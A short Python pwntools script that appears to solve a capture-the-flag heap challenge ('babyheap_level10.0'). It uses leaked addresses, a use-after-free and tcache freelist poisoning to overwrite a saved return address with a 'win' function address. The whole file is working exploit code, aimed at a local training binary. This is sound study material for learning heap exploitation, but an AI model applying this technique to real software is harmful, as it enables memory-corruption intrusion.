from pwn import *
#offset to the rip +280
r = process("/challenge/babyheap_level10.0")
leak_stack = r.readuntil("The address")[367:-21]
main_addr = r.read()[16:-48].decode()
win_addr = main_addr
rip = int(leak_stack,16) + 280
log.info(f"Stack Address {leak_stack}")
log.info(f"Main Address {main_addr}")
log.info(f"Offset Ret Addr : {hex(rip)}")
win_addr = str(hex(int(main_addr,16)))
win_addr = int(win_addr[:-2]+"00",16)
log.info(f"Win Addr {hex(win_addr)}")
for i in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"32")
for b in range(0,2):
        r.sendline(b"free")
        r.sendline(str(b).encode())
r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(p64(rip))
for i in range(0,2):
        r.sendline(b"malloc")
        r.sendline(str(i).encode())
        r.sendline(b"32")
r.sendline(b"scanf")
r.sendline(b"1")
r.sendline(p64(win_addr))
r.sendline(b"quit")
r.interactive()
